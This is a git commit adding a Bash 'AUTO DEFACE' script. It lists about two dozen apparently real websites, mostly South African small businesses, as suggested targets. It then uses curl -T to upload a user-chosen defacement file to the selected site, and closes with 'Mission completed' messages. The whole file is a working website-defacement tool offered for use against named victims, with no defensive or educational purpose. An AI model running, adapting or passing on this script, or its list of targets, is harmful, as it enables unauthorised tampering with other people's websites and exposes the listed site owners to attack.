fb09a9139abfd555fd62931296b70e2b53bccf07
WHISKY-KIV <72498868+WHISKY-KIV@users.noreply.github.com>
2020-10-07 16:23:16 +0530

    Add files via upload

---
+++ index.sh
@@ -0,0 +1,92 @@
+#lu recode gua sumpahin melarat#
+
+clear
+sleep 1
+echo "[+] Loading...." | lolcat
+sleep 3
+clear
+figlet POWER VARATTA  |lolcat
+sleep 2
+echo "_______________________________________________>
+
+
+             AUTO DEFACE
+
+
+[+] Coded   : MARKIV
+
+
+________________________________________________________" | lolcat
+sleep 1
+echo "[+] Waiting For Server.." | lolcat
+sleep 3
+echo "[+] SELECT YOUR FAVORITE WEBSITE" | lolcat 
+sleep 2
+echo "____________________________________________
+
+﻿http://africaprop.co.za/
+
+ http://ballastbrokers.co.za/
+
+ http://www.ajaxfilebrowser.com/
+
+ http://hq.prospec.co.th/
+
+ http://branch.prospec.co.th/
+
+ http://bestilling.udir.no
+
+ http://windmillsandporcupines.co.za/
+
+ http://colourfactory.co.za/
+
+ http://daretogowildafrica.co.za/
+
+ http://foodconsult.co.za/
+
+ http://holotropicbreathwork.co.za/
+
+ http://mestern.co.za/
+
+ http://mc3qs.com/
+
+ http://my-resume.biz/
+
+ http://mpark.co.za/
+
+ http://allpaint.co.za/
+
+ http://www.aquafitness.za.net/
+
+ http://www.drcrsaexpress.co.za/
+
+ http://troop-1539.org/
+
+ http://happy.mikikk.co.jp/
+
+ http://stand66.com/
+
+ http://tressor.co.za/
+
+ http://gordonhoward.co.za/
+
+ http://chillibitez.co.za/
+
+ http://cmweb.co.za/
+
+ http://essentialtours.com/
+
+______________________________________" | lolcat
+                              
+echo "[+] Website Target : " $target |lolcat
+read target
+echo "[+] processing..." | lolcat 
+sleep 2                        
+echo "[+] Name of your deface : " $sc |lolcat
+read sc
+curl -T /storage/emulated/0/$sc $target
+echo "[+] Mission completed :" $sc | lolcat
+sleep 2                             
+echo "[+] Done!! " | lolcat
+sleep 2
+echo "Enjoy have a blast with markiv"
